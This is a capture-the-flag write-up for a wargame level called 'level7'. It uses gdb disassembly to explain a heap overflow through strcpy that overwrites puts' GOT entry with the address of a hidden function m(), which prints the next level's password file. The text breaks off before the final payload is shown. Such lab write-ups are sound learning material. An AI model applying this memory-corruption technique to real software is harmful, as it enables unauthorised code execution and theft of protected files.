## level7

The `level7` expects at least two arguments otherwise it will crash. There are two functions, `main()` and `m()` and `m()` is naver called from `main()` we can see it using:
```
(gdb) info functions

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf
0x080483b0  printf@plt
0x080483c0  fgets
0x080483c0  fgets@plt
0x080483d0  time
0x080483d0  time@plt
0x080483e0  strcpy
0x080483e0  strcpy@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x08048430  fopen
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m                      <-----------------
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini
```
Many of those functions are from main because the `m()` functions is a relly short one
```
0x080484f4 <+0>:	push   ebp
0x080484f5 <+1>:	mov    ebp,esp
0x080484f7 <+3>:	sub    esp,0x18
0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
0x08048501 <+13>:	call   0x80483d0 <time@plt>
0x08048506 <+18>:	mov    edx,0x80486e0
0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
0x08048517 <+35>:	mov    DWORD PTR [esp],edx
0x0804851a <+38>:	call   0x80483b0 <printf@plt>
0x0804851f <+43>:	leave
0x08048520 <+44>:	ret
```
Disassembling `main()` we see four calls to `malloc()`, two calls to `strcpy()` *(we know `strpcy()` is vulnerable)*, one call to `fopen()`, one call to `fgets()` and one last call to `puts()`. <br> Every call to `malloc()` is made with an `0x8 bytes`.<br> Both `strcpy()` are taking the arguments as it's seconde parameter `strcpy(*dst, argv[1]) - strcpy(*dst, argv[2])` *(that is the reason it will crash if less than two parameters is passed)*
```
~$ gdb -q level7
b *0x080485a0
b *0x080485bd
(gdb) r
Breakpoint 1, 0x080485a0 in main ()
x/s $edx
0xbffff8c3:	 "AAA"
(gdb) r
Breakpoint 2, 0x080485bd in main ()
x/s $edx
0xbffff8c7:	 "BBB"
```

We can use the first `strcpy(*dest, 20 * 'A' + 08049928)` to overflow  and overwrite the  __address__ *(first argument passed to the second `strcpy(*dest <--, *src)`)* and if we place the __address__ of the `GOT` *(yes the same strategy as in `level5`)* of the function  `puts()` and we place  the __address__ of function `m()` to be passed as argument to the second `strcpy()` this function will execute and we will get our flag.<br>
In the `main()` as already said there will be 4 `malloc()` and the `strcpy()` will copy what we entered as first argument to the first __address__ return by `malloc()` and the second argument will be copied to the last __address__ returned by `malloc()` there are also a call to `fopen()` right after the last `strcpy()` and if we examine one __address__ just before the call we see what the function is trying to open <br>
```
0x080485c7 <+166>:	mov    eax,0x80486eb
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
```
From this we know the program is opening the file that contains our *flag* we just have to wait to it to open the file and call `fgets()` right after and store this value in a global variable <br>
`0x080485e4 <+195>:	mov    DWORD PTR [esp],0x804996` <br> and this same variable is passed to `printf()` in the `m()` program that is never called, check the `m()` function above and you can see the same address being passed to `printf()` and four our happiness just before the `main()` funtions returns there's a call to `puts()` coincidence ?
So
